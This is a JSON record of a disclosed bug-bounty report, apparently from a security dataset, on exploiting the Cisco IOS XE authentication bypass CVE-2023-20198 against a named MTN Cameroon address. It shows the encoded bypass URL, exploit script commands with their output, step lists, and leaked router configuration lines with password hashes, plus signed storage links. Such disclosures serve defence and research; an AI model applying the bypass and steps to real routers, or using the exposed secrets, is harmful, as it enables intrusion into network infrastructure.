{
  "reported_to": "MTN Group",
  "reported_by": "offensiveops ",
  "title": "Cisco IOS XE instance at 41.208.24.174 vulnerable to CVE-2023-20198",
  "content": "\nSummary:\nCVE-2023-20198 is characterized by improper path validation to bypass Nginx filtering to reach the webui_wsma_http web endpoint without requiring authentication. By bypassing authentication to the endpoint, an attacker can execute arbitrary Cisco IOS commands or issue configuration changes with Privilege 15 privileges. Further attacks involved exploitation of CVE-2023-20273 to escalate to the underlying Linux OS root user to facilitate implantation.\nThis PoC exploits CVE-2023-20198 to leverage two different XML SOAP endpoints:\nThe vulnerability check, config, and command execution options all target the cisco:wsma-exec SOAP endpoint to insert commands into the execCLI element tag.\nThe add user option targets the cisco:wsma-config SOAP endpoint to issue a configuration change and add the Privilege 15 account. This endpoint could be [ab]used to make other configuration changes, but thats outside the scope of this PoC.\nProof On Concepts :\n<image_0>\nSign in as any user shodan query\nVisit Searchbar and Search Query org: \"MTN Innovation Centre\"\nFound domain owned by MTN Cameroon as 41.208.24.174\nIntercept url to burp-suite and sent to repeater\nSent to intruder and Set up the exploits here\nRun exploits bellow command\nCode 352 Bytes\n1exploit.py -t 41.208.24.174 -c\n2\n3Testing for vulnerability\n4Target IP:      41.208.24.174\n5Target URL:     http://41.208.24.174/%2577eb%2575i_%2577sma_Http\n6Vulnerable:     True\n7IOS Ver:        ISR4331/K9 europ-constantia-2 IOS 16.6 Cisco IOS Software [Everest], ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.6.4, RELEASE SOFTWARE (fc3)\n8\n9Done.\nCode 266 Bytes\n1exploit.py -t 41.208.24.174 -g\n2\n3Selected Target:        41.208.24.174\n4Running in Exec Mode\n5Executing Command:      sh run\n6\n7Sending exploit to target URL:  http://41.208.24.174/%2577eb%2575i_%2577sma_Http\n8\n9Building configuration...\n10Current configuration : 17326 bytes\nCode 233 Bytes\n1enable secret 5 $1$vF3Q$wplcifyib3DUyzbgcUGe/1\n2enable password 7 1214041E1E\n3snmp-server trap-source GigabitEthernet0/0/0.3029\n4snmp-server source-interface informs GigabitEthernet0/0/0.3029\n5snmp-server contact noc@mtnns.net 0860110860\nand you can see all the sensitive for configuration was exposed\n<image_1>\n<image_2>\n<image_3>\nSupporting Material/References:\nCisco Advisory\nhorizon3ai CVE-2023-20198 research\nhorizon3ai CVE-2023-20198 PoC\nLeakIX CVE-2023-20273 PoC\nImpact\nCisco is providing an update for the ongoing investigation into observed exploitation of the web UI feature in Cisco IOS XE Software. We are updating the list of fixed releases and adding the Software Checker. Our investigation has determined that the actors exploited two previously unknown issues. The attacker first exploited CVE-2023-20198 to gain initial access and issued a privilege 15 command to create a local user and password combination. This allowed the user to log in with normal user access. The attacker then exploited another component of the web UI feature, leveraging the new local user to elevate privilege to root and write the implant to the file system.\n\n",
  "severity": [
    9.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cqtiarswk5pgfccbgir5zu1p0fnf?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5LA7DQI%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCc9YRXRTUx7Idj8qb1jMs8QfGH8fy%2Fdyzg5FiBsjhXcwIhAKoWaqUpLoKkj2Q%2FKa8PGA5BO4fH3QsXEC83tqvrkQarKroFCPP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOHB4MdDjRzMCG6vIqjgW2GK%2FCSrsbka9rau%2B54wjD1LthKu7b7GofM5pKLSqbaiVagCLur49Dv%2BvNq0a9o9UIDTTwM03gNZhtnaWqyehDfLh0XbcKXSfCmg9%2B0coUBWlEAFCEbWPghkXZZFPfpGmI36BD%2FjHP1kZ6XuN5J8aWdXRhMK4NyvjK%2Fm7%2BzkFEBintTo%2FNphm6eqxqOzYNEe1QvrZ03iBYRZEIXBoXfuIHSJIih81fI92B%2FB2ZnDOfTzAbI083G9czb06XbwwFqp2P8OOh2YJc3k10ECUrlsBo1dkoBH3h9qC%2FcEpsrPtRwVCPRmG4J3wneQmewR%2FrzULqW3CbI29V89VlUPpQl5UML%2FDHhlou5IUAqMn0Liufkd60KRdJS%2Bahn4dhPHN3oJtQj6O0A%2F7A3MOhPz%2ByCdoeHs3VNQo3rVrTJGHxF35LzmrYVysN6qSNkpCpQsJyuyUBTm2xoF%2FXjDlQPo1mH%2FxOcFNQPJu02iJHx%2FPZjj%2FW2II%2BqoE%2FiHgiwXE1nVgOiSaKfG9HtMpzTZ23EQRdAud7Q13KrEcI%2BNjIZghSp8sYXBgSSRg5aobdzGtLGobJ4xeF0dp%2FMvmi1mzCcxLR3yWX2uiiYQE57n9eeNqRoeKfh57x0TcJuf0TfcXZTbN33tGcZ1b8qoWpYfe4fz8bouYBFBD6EIXv49hmHrMktYgpIUaVFxIeiGL3DfEFbMoVYZb0HLi24dFvH78MZfCV5pMBxZk5dHz4fRO7qVHEutQTOCKUqiGEhknbdTuU7otiJhFyeimoJgo1Sa8NsTXWvCY5CUX5N4wTM5jPdHOI3jBbOHgWBC4A6MnZV90bLHNcX0ZWml0ZNSTZO3CU3U2ZrP5r%2FktibBLhpPyUlhRuvV0wurqGvwY6sAGXzAf33n8WVCnRFn68JktYUcbOaeC2aVHjNhAbYa%2B1YsEqAkpoz2gIX5M3wZu5iJ%2F86GPsW3o3PSVErs%2BtQrmSkl3cSYZc%2BJWcvaYaGTirkMGg6Pr94SkL0OUDuUbCiqLqicvXacfZyfn0Rem0cZtH%2FurPe1A%2Fk078EVQv%2FaaAEAfc%2B6VVPBs%2BODhaqlSAh%2FSQmiTy%2Fq4SshBRcgFaFqiuGSxUgqyqt8gGCu0Uqgc4IQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60b98eb247fe19a38cf2fce0b7f4029d592da0ca1f412282bbe1c5f608eaefd1",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xiu6z5iczll21nz7wzeh6jd7bjv7?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5LA7DQI%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCc9YRXRTUx7Idj8qb1jMs8QfGH8fy%2Fdyzg5FiBsjhXcwIhAKoWaqUpLoKkj2Q%2FKa8PGA5BO4fH3QsXEC83tqvrkQarKroFCPP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOHB4MdDjRzMCG6vIqjgW2GK%2FCSrsbka9rau%2B54wjD1LthKu7b7GofM5pKLSqbaiVagCLur49Dv%2BvNq0a9o9UIDTTwM03gNZhtnaWqyehDfLh0XbcKXSfCmg9%2B0coUBWlEAFCEbWPghkXZZFPfpGmI36BD%2FjHP1kZ6XuN5J8aWdXRhMK4NyvjK%2Fm7%2BzkFEBintTo%2FNphm6eqxqOzYNEe1QvrZ03iBYRZEIXBoXfuIHSJIih81fI92B%2FB2ZnDOfTzAbI083G9czb06XbwwFqp2P8OOh2YJc3k10ECUrlsBo1dkoBH3h9qC%2FcEpsrPtRwVCPRmG4J3wneQmewR%2FrzULqW3CbI29V89VlUPpQl5UML%2FDHhlou5IUAqMn0Liufkd60KRdJS%2Bahn4dhPHN3oJtQj6O0A%2F7A3MOhPz%2ByCdoeHs3VNQo3rVrTJGHxF35LzmrYVysN6qSNkpCpQsJyuyUBTm2xoF%2FXjDlQPo1mH%2FxOcFNQPJu02iJHx%2FPZjj%2FW2II%2BqoE%2FiHgiwXE1nVgOiSaKfG9HtMpzTZ23EQRdAud7Q13KrEcI%2BNjIZghSp8sYXBgSSRg5aobdzGtLGobJ4xeF0dp%2FMvmi1mzCcxLR3yWX2uiiYQE57n9eeNqRoeKfh57x0TcJuf0TfcXZTbN33tGcZ1b8qoWpYfe4fz8bouYBFBD6EIXv49hmHrMktYgpIUaVFxIeiGL3DfEFbMoVYZb0HLi24dFvH78MZfCV5pMBxZk5dHz4fRO7qVHEutQTOCKUqiGEhknbdTuU7otiJhFyeimoJgo1Sa8NsTXWvCY5CUX5N4wTM5jPdHOI3jBbOHgWBC4A6MnZV90bLHNcX0ZWml0ZNSTZO3CU3U2ZrP5r%2FktibBLhpPyUlhRuvV0wurqGvwY6sAGXzAf33n8WVCnRFn68JktYUcbOaeC2aVHjNhAbYa%2B1YsEqAkpoz2gIX5M3wZu5iJ%2F86GPsW3o3PSVErs%2BtQrmSkl3cSYZc%2BJWcvaYaGTirkMGg6Pr94SkL0OUDuUbCiqLqicvXacfZyfn0Rem0cZtH%2FurPe1A%2Fk078EVQv%2FaaAEAfc%2B6VVPBs%2BODhaqlSAh%2FSQmiTy%2Fq4SshBRcgFaFqiuGSxUgqyqt8gGCu0Uqgc4IQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2636239569ebb8a2a44a2f662c73f34de892cc6c2459dcc46067ce8e360c721a",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o3f6ivn4ri9q089xf7ggin64tobj?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5LA7DQI%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCc9YRXRTUx7Idj8qb1jMs8QfGH8fy%2Fdyzg5FiBsjhXcwIhAKoWaqUpLoKkj2Q%2FKa8PGA5BO4fH3QsXEC83tqvrkQarKroFCPP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOHB4MdDjRzMCG6vIqjgW2GK%2FCSrsbka9rau%2B54wjD1LthKu7b7GofM5pKLSqbaiVagCLur49Dv%2BvNq0a9o9UIDTTwM03gNZhtnaWqyehDfLh0XbcKXSfCmg9%2B0coUBWlEAFCEbWPghkXZZFPfpGmI36BD%2FjHP1kZ6XuN5J8aWdXRhMK4NyvjK%2Fm7%2BzkFEBintTo%2FNphm6eqxqOzYNEe1QvrZ03iBYRZEIXBoXfuIHSJIih81fI92B%2FB2ZnDOfTzAbI083G9czb06XbwwFqp2P8OOh2YJc3k10ECUrlsBo1dkoBH3h9qC%2FcEpsrPtRwVCPRmG4J3wneQmewR%2FrzULqW3CbI29V89VlUPpQl5UML%2FDHhlou5IUAqMn0Liufkd60KRdJS%2Bahn4dhPHN3oJtQj6O0A%2F7A3MOhPz%2ByCdoeHs3VNQo3rVrTJGHxF35LzmrYVysN6qSNkpCpQsJyuyUBTm2xoF%2FXjDlQPo1mH%2FxOcFNQPJu02iJHx%2FPZjj%2FW2II%2BqoE%2FiHgiwXE1nVgOiSaKfG9HtMpzTZ23EQRdAud7Q13KrEcI%2BNjIZghSp8sYXBgSSRg5aobdzGtLGobJ4xeF0dp%2FMvmi1mzCcxLR3yWX2uiiYQE57n9eeNqRoeKfh57x0TcJuf0TfcXZTbN33tGcZ1b8qoWpYfe4fz8bouYBFBD6EIXv49hmHrMktYgpIUaVFxIeiGL3DfEFbMoVYZb0HLi24dFvH78MZfCV5pMBxZk5dHz4fRO7qVHEutQTOCKUqiGEhknbdTuU7otiJhFyeimoJgo1Sa8NsTXWvCY5CUX5N4wTM5jPdHOI3jBbOHgWBC4A6MnZV90bLHNcX0ZWml0ZNSTZO3CU3U2ZrP5r%2FktibBLhpPyUlhRuvV0wurqGvwY6sAGXzAf33n8WVCnRFn68JktYUcbOaeC2aVHjNhAbYa%2B1YsEqAkpoz2gIX5M3wZu5iJ%2F86GPsW3o3PSVErs%2BtQrmSkl3cSYZc%2BJWcvaYaGTirkMGg6Pr94SkL0OUDuUbCiqLqicvXacfZyfn0Rem0cZtH%2FurPe1A%2Fk078EVQv%2FaaAEAfc%2B6VVPBs%2BODhaqlSAh%2FSQmiTy%2Fq4SshBRcgFaFqiuGSxUgqyqt8gGCu0Uqgc4IQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58278c4b95ea27ce6f4a24ea39e62d404c4cdc4ef6b9212772c58f3742ba2c3b",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0tjsb8ombc09sadn0a8mjy8t6eyu?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5LA7DQI%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCc9YRXRTUx7Idj8qb1jMs8QfGH8fy%2Fdyzg5FiBsjhXcwIhAKoWaqUpLoKkj2Q%2FKa8PGA5BO4fH3QsXEC83tqvrkQarKroFCPP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOHB4MdDjRzMCG6vIqjgW2GK%2FCSrsbka9rau%2B54wjD1LthKu7b7GofM5pKLSqbaiVagCLur49Dv%2BvNq0a9o9UIDTTwM03gNZhtnaWqyehDfLh0XbcKXSfCmg9%2B0coUBWlEAFCEbWPghkXZZFPfpGmI36BD%2FjHP1kZ6XuN5J8aWdXRhMK4NyvjK%2Fm7%2BzkFEBintTo%2FNphm6eqxqOzYNEe1QvrZ03iBYRZEIXBoXfuIHSJIih81fI92B%2FB2ZnDOfTzAbI083G9czb06XbwwFqp2P8OOh2YJc3k10ECUrlsBo1dkoBH3h9qC%2FcEpsrPtRwVCPRmG4J3wneQmewR%2FrzULqW3CbI29V89VlUPpQl5UML%2FDHhlou5IUAqMn0Liufkd60KRdJS%2Bahn4dhPHN3oJtQj6O0A%2F7A3MOhPz%2ByCdoeHs3VNQo3rVrTJGHxF35LzmrYVysN6qSNkpCpQsJyuyUBTm2xoF%2FXjDlQPo1mH%2FxOcFNQPJu02iJHx%2FPZjj%2FW2II%2BqoE%2FiHgiwXE1nVgOiSaKfG9HtMpzTZ23EQRdAud7Q13KrEcI%2BNjIZghSp8sYXBgSSRg5aobdzGtLGobJ4xeF0dp%2FMvmi1mzCcxLR3yWX2uiiYQE57n9eeNqRoeKfh57x0TcJuf0TfcXZTbN33tGcZ1b8qoWpYfe4fz8bouYBFBD6EIXv49hmHrMktYgpIUaVFxIeiGL3DfEFbMoVYZb0HLi24dFvH78MZfCV5pMBxZk5dHz4fRO7qVHEutQTOCKUqiGEhknbdTuU7otiJhFyeimoJgo1Sa8NsTXWvCY5CUX5N4wTM5jPdHOI3jBbOHgWBC4A6MnZV90bLHNcX0ZWml0ZNSTZO3CU3U2ZrP5r%2FktibBLhpPyUlhRuvV0wurqGvwY6sAGXzAf33n8WVCnRFn68JktYUcbOaeC2aVHjNhAbYa%2B1YsEqAkpoz2gIX5M3wZu5iJ%2F86GPsW3o3PSVErs%2BtQrmSkl3cSYZc%2BJWcvaYaGTirkMGg6Pr94SkL0OUDuUbCiqLqicvXacfZyfn0Rem0cZtH%2FurPe1A%2Fk078EVQv%2FaaAEAfc%2B6VVPBs%2BODhaqlSAh%2FSQmiTy%2Fq4SshBRcgFaFqiuGSxUgqyqt8gGCu0Uqgc4IQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00551163dd1fe9891e7e8a1f1d481632500d7a31e36142cb37e040b22224d9dc"
  },
  "disclosed_date": 1739964180,
  "report_url": "https://hackerone.com/reports/2778350",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the target Cisco IOS XE instance (e.g., 41.208.24.174) using Shodan or similar tools."
    ],
    [
      2,
      "Intercept the web traffic using a tool like Burp Suite and send the request to the repeater."
    ],
    [
      3,
      "Exploit the vulnerability by sending crafted requests to the vulnerable endpoint (http://41.208.24.174/%2577eb%2575i_%2577sma_Http) to bypass authentication and execute arbitrary commands or configuration changes."
    ],
    [
      4,
      "Verify the exploit by checking the response for sensitive configuration data or successful command execution."
    ]
  ],
  "vuln_description": "CVE-2023-20198 is an authentication bypass vulnerability in Cisco IOS XE that allows an attacker to reach the webui_wsma_http endpoint without authentication. This enables the execution of arbitrary Cisco IOS commands or configuration changes with Privilege 15 privileges. Further exploitation can escalate privileges to the underlying Linux OS root user.",
  "reason": "The vulnerability involves multiple components, including bypassing Nginx filtering, exploiting SOAP endpoints, and understanding Cisco IOS command syntax. The interaction between these components is non-obvious, requiring knowledge of both web application security and Cisco-specific configurations.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves bypassing authentication to a specific web endpoint (webui_wsma_http) by manipulating the URL path. This falls under the AuthN/AuthZ Bypass methodology where an unauthenticated user can access functionality (executing arbitrary Cisco IOS commands) that should require authentication. The methodology involves testing actions with unauthenticated sessions (step d) and swapping resource_ids (step e)), which would detect this vulnerability.",
    "is_detectable": true
  }
}